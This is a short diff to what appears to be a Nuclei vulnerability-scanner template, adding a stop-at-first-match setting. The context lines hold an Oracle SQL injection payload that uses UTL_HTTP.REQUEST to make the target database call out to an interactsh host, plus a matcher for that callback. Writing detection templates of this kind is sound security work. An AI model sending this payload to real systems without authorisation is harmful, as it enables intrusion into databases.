@@ -11,6 +11,7 @@ http:
     path:
       - "{{BaseURL}}/?id=1; SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}') FROM DUAL--"
 
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
